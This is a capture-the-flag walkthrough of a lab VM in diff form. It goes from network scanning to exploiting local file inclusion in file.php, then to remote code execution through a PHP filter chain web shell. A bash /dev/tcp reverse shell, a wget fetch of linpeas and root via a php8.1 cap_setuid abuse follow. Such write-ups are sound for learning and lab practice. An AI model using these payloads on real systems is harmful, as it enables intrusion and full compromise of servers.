@@ -1,1 +1,464 @@
+			ENUMERATION
 
+---ifconfig---
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 15  bytes 4022 (3.9 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 54  bytes 6217 (6.0 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 24  bytes 1440 (1.4 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 24  bytes 1440 (1.4 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+---netdiscover---
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+ Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts                                                       
+                                                                                                                       
+ 135 Captured ARP Req/Rep packets, from 7 hosts.   Total size: 8100                                                    
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00     20    1200  Unknown vendor                                                      
+ 10.0.2.2        52:54:00:12:35:00     19    1140  Unknown vendor                                                      
+ 10.0.2.3        08:00:27:f8:6f:c1     19    1140  PCS Systemtechnik GmbH                                              
+ 10.0.2.34       08:00:27:d7:ad:4a     20    1200  PCS Systemtechnik GmbH                                              
+ 10.0.2.34       08:00:27:f8:cc:57     19    1140  PCS Systemtechnik GmbH                                              
+ 10.0.2.35       08:00:27:f8:cc:57     19    1140  PCS Systemtechnik GmbH                                              
+ 10.0.2.35       08:00:27:d7:ad:4a     19    1140  PCS Systemtechnik GmbH                                              
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+                    
+
+
+
+---nmap on our target---
+                                                                              
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.34 -sS -sC -sV -A -T4 -p-    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-02 18:51 +03
+Nmap scan report for 10.0.2.34
+Host is up (0.00085s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 17:c4:c9:b5:94:24:9f:9c:db:33:34:d1:99:b7:23:1e (ECDSA)
+|_  256 ce:83:07:4b:42:70:87:47:37:4d:d9:d6:8d:56:28:62 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Quick Automative
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+MAC Address: 08:00:27:F8:CC:57 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.85 ms 10.0.2.34
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 39.17 seconds
+                
+
+
+---let's run ctfenum to check for extra vulnerabilities---
+
+┌──(root㉿kali)-[/home/okina]
+└─# python3 /opt/CTFEnum/CTFenum/CTFenum.py 10.0.2.34
+======================================================================
+[!] Checking open ports
+======================================================================
+OPEN TCP PORTS:
+[!] nmap -Pn -T3 -n -p- 10.0.2.34
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:D7:AD:4A (Oracle VirtualBox virtual NIC)
+======================================================================
+[!] Generating Nmap output
+======================================================================
+NMAP TCP OUTPUT:
+[!] nmap -T5 -n -Pn -sCV -p22,80 10.0.2.34
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 17:c4:c9:b5:94:24:9f:9c:db:33:34:d1:99:b7:23:1e (ECDSA)
+|_  256 ce:83:07:4b:42:70:87:47:37:4d:d9:d6:8d:56:28:62 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Quick Automative
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+MAC Address: 08:00:27:D7:AD:4A (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+======================================================================
+[!] Attacking port 22
+[!] SSH
+[!] You can try to bruteforce credentials using [netexec|crackmapexec|hydra].
+netexec ssh $(IP) -u usernames.txt -p passwords.txt | grep -v fail
+======================================================================
+[!] Attacking port 80
+[!] Comments found in: http://10.0.2.34:80/
+<!-- Photo by Pixabay: https://www.pexels.com/photo/black-lamborghini-murcielago-38570/ -->
+
+<!-- Service List -->
+
+<!-- Customer Reviews -->
+
+<!-- Call to Action -->
+======================================================================
+[!] Attacking port 80
+[!] Apache server, Fuzzing for PHP files.
+[!] Apache/2.4.52 (Ubuntu)
+======================================================================
+[!] Attacking port 80
+[!] gobuster dir -u http://10.0.2.34:80 -w /opt/CTFEnum/CTFenum/mods/wordlist.txt -x .txt,.bak,.cgi,.html,.php -t 70 -z --no-error -k
+[!] URL: http://10.0.2.34:80
+
+/cars.php             (Status: 200) [Size: 1502]
+/connect.php          (Status: 500) [Size: 0]
+/contact.php          (Status: 200) [Size: 1395]
+/about.php            (Status: 200) [Size: 1446]
+/file.php             (Status: 200) [Size: 200]
+/home.php             (Status: 200) [Size: 2539]
+/images               (Status: 301) [Size: 307] [--> http://10.0.2.34/images/]
+/index.php            (Status: 200) [Size: 3825]
+/news.php             (Status: 200) [Size: 560]
+
+
+
+---we find some pages and one of these is file.php page, here we can enter text---
+
+---I tried to create a reverse connection from the form but it didn't work. However, 
+whatever text we enter in the form the url changes to http://10.0.2.34/file.php?file=ghg---
+ 
+
+NOT: https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections websitesinden bazı wordlistler
+indirdim. /home/okina/wordlists klasöründeler. 
+
+
+
+
+---So lets do some fuzzing to find out any other subdomains exist within this file.php page---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# ffuf -u http://10.0.2.34/file.php?file=FUZZ -w wordlists/Traversal.txt -c -fs 200
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.0.2.34/file.php?file=FUZZ
+ :: Wordlist         : FUZZ: /home/okina/wordlists/Traversal.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 200
+________________________________________________
+
+../../../../../../../../../../../../etc/hosts [Status: 200, Size: 421, Words: 37, Lines: 23, Duration: 7ms]
+/./././././././././././etc/passwd [Status: 200, Size: 2018, Words: 31, Lines: 48, Duration: 14ms]
+/../../../../../../../../../../etc/passwd [Status: 200, Size: 2018, Words: 31, Lines: 48, Duration: 14ms]
+../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2018, Words: 31, Lines: 48, Duration: 2355ms]
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 2018, Words: 31, Lines: 48, Duration: 4374ms]
+:: Progress: [68/68] :: Job [1/1] :: 15 req/sec :: Duration: [0:00:04] :: Errors: 2 ::
+                    
+
+-c: Colorize the output
+-fs: Filters the http response size
+
+
+
+---now we have found those hidden pages, I go to my browser---
+
+http://10.0.2.34/file.php?file=/./././././././././././etc/passwd
+
+
+---and see two usernames in this passwd page, andrew and nick---
+
+
+andrew:x:1000:1000:Andrew Speed:/home/andrew:/bin/bash 
+nick:x:1001:1001:Nick Greenhorn,,,:/home/nick:/bin/bash 
+
+
+
+NOTE: To have a clearer view of /etc/passwd file you can write:
+
+┌──(root㉿kali)-[/home/okina]
+└─# curl 10.0.2.34/file.php?file=/etc/passwd    
+
+
+
+---This case is a LFI vulnerability, the purpose of those vulnerabilities is to turn them into
+RCE vulnerabilities, otherwise we can only read some files from the server---
+
+---To test for and find an RCE vulnerability, if we already have an LFI vulnerability we can
+make use of php wrappers. They are a feature that allows php to access different types of
+remote or local resources using common PHP I/O functions. These wrappers act like an abstraction
+layer over different transmission protocols sych as http, ftp, ssl etc---
+
+---For example we can use the wrapper 'php://filter' which allows us to encode the resource we
+specify. So that we can read PHP code that the browser would otherwise interpret directly---
+
+
+
+---To use the php wrapper we need to write the following into the url---
+
+http://10.0.2.34/file.php?file=php://filter/convert.base64-encode/resource=/./././././././././././var/www/html/file.php
+
+
+
+---after that we can copy the text we found and can try to decode it using base64---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# echo 'PGh0bWw+Cjxib2R5PgoKPGgyPkxvY2FsIEZpbGUgSW5jbHVzaW9uIFZ1bG5lcmFiaWxpdHk8L2gyPgoKPGZvcm0
+gbWV0aG9kPSJnZXQiIGFjdGlvbj0iPD9waHAgZWNobyAkX1NFUlZFUlsnUEhQX1NFTEYnXTs/PiI+CiAgRmlsZSB0byBpbmNs
+dWRlOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZmlsZSI+CiAgPGlucHV0IHR5cGU9InN1Ym1pdCI+CjwvZm9ybT4KCjw/c
+GhwCmlmIChpc3NldCgkX0dFVFsnZmlsZSddKSkgewogIGluY2x1ZGUoJF9HRVRbJ2ZpbGUnXSk7Cn0KPz4KCjwvYm9keT4KPC
+9odG1sPgo= ' | base64 -d
+
+<html>
+<body>
+
+<h2>Local File Inclusion Vulnerability</h2>
+
+<form method="get" action="<?php echo $_SERVER['PHP_SELF'];?>">
+  File to include: <input type="text" name="file">
+  <input type="submit">
+</form>
+
+<?php
+if (isset($_GET['file'])) {
+  include($_GET['file']);
+}
+?>
+
+</body>
+</html>
+base64: invalid input
+
+
+---here we see the inside of file.php having decoded the encryption and from here we can understand that 
+it uses the include() function, which allows us to execute php code---
+
+
+---to exploit this vulnerability we can use "php chain filter" method to use data manipulation 
+capabilites of php://filter, with this method we can manipulate the input data that will be put
+in the include() function---
+
+
+---I searched and found a tool that we can use this method in order to progress, php_filter_chain_generator---
+
+
+---to get more info about this dude check https://github.com/synacktiv/php_filter_chain_generator---
+
+
+---I download this tool to /opt---
+
+
+                                                          
+┌──(root㉿kali)-[/opt/php_filter_chain_generator]
+└─# python3 php_filter_chain_generator.py --help                     
+usage: php_filter_chain_generator.py [-h] [--chain CHAIN] [--rawbase64 RAWBASE64]
+
+PHP filter chain generator.
+
+options:
+  -h, --help            show this help message and exit
+  --chain CHAIN         Content you want to generate. (you will maybe need to pad with spaces for
+                        your payload to work)
+  --rawbase64 RAWBASE64
+                        The base64 value you want to test, the chain will be printed as base64 by
+                        PHP, useful to debug.
+        
+
+┌──(root㉿kali)-[/opt/php_filter_chain_generator]
+└─# python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]);?>'
+[+] The following gadget chain will generate the following code : <?php system($_GET["cmd"]);?> (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
+             
+
+---we use this filter but in the browser url we will go and add &cmd=id' & to the end of the url 
+so the end of it will look like this---
+
+resource=php://temp&cmd=id' &
+
+
+
+---And now that we see it works we will create a reverse shell, lets set up a listener first---
+
+┌──(root㉿kali)-[/opt/php_filter_chain_generator]
+└─# nc -lnvp 1234
+listening on [any] 1234 ...
+
+
+
+---And now we search for a reverse shell, I go to revshells.com and create a reverse shell there---
+
+/bin/bash -i >& /dev/tcp/10.0.2.15/1234 0>&1
+
+
+---now we will replace the id part at the end of the url with the reverse shell but first we will encode
+it with url encode so that it works within our url as well, it looks like this after the encoding---
+
+%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.15%2F1234%200%3E%261
+
+
+
+---so the end of my url looks like this---
+
+php://temp&cmd=%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.15%2F1234%200%3E%261
+
+
+
+---we hit enter and then check our netcat---
+
+
+
+
+					GAINING FOOTHOLD
+
+┌──(root㉿kali)-[/opt/php_filter_chain_generator]
+└─# nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.34] 46812
+bash: cannot set terminal process group (736): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@quick2:/var/www/html$ cd /home
+cd /home
+
+
+---we are in, lets look for the first user flag---
+
+
+www-data@quick2:/home$ ls
+ls
+andrew
+nick
+www-data@quick2:/home$ cd andrew
+cd andrew
+bash: cd: andrew: Permission denied
+www-data@quick2:/home$ cd nick
+cd nick
+www-data@quick2:/home/nick$ ls
+ls
+user.txt
+www-data@quick2:/home/nick$ cat user.txt
+cat user.txt
+
+			---First User Flag---
+
+
+
+
+---We got the first flag. lets upgrade the terminal---
+
+
+www-data@quick2:/home/nick$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+
+
+
+
+					PRIVILEGE ESCALATION
+
+
+---I will use linpeas.sh to look for priv esc, lets start our python server and then upload it--- 
+
+┌──(root㉿kali)-[/home/okina]
+└─# python3 -m http.server 6060                      
+Serving HTTP on 0.0.0.0 port 6060 (http://0.0.0.0:6060/) ...
+
+www-data@quick2:/home$ cd /tmp
+cd /tmp
+
+---I go to /tmp folder because in other folders we face permission problems, but /tmp folder
+holds temporary files as you know so the content of this folder is deleted every time the machine 
+is restarted---
+
+www-data@quick2:/tmp$ wget http://10.0.2.15:6060/linpeas.sh
+wget http://10.0.2.15:6060/linpeas.sh
+--2024-04-10 14:35:10--  http://10.0.2.15:6060/linpeas.sh
+Connecting to 10.0.2.15:6060... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 860549 (840K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh          100%[===================>] 840.38K  --.-KB/s    in 0.01s   
+
+2024-04-10 14:35:10 (55.5 MB/s) - ‘linpeas.sh’ saved [860549/860549]
+
+
+
+www-data@quick2:/tmp$ bash linpeas.sh
+bash linpeas.sh
+
+
+---we find a vulnerability---
+
+/usr/bin/php8.1 cap_setuid=ep
+
+
+---I search for the php suid escalations in gtfobins.com and find it---
+
+
+CMD="/bin/sh"
+./php -r "pcntl_exec('/bin/sh', ['-p']);"
+
+
+
+---I modify it and then write in the terminal---
+
+www-data@quick2:/tmp$ CMD="/bin/bash"
+CMD="/bin/bash"
+www-data@quick2:/tmp$ php8.1 -r "posix_setuid(0); system('$CMD');"
+php8.1 -r "posix_setuid(0); system('$CMD');"
+root@quick2:/tmp# whoami
+whoami
+root
+
+
+---boom, finally we are root, lets get that damn flag---
+
+ 
+root@quick2:/tmp# cd /root
+cd /root
+root@quick2:/root# ls
+ls
+root.txt
+snap
+root@quick2:/root# cat root.txt
+cat root.txt
+
+			---Root User Flag---
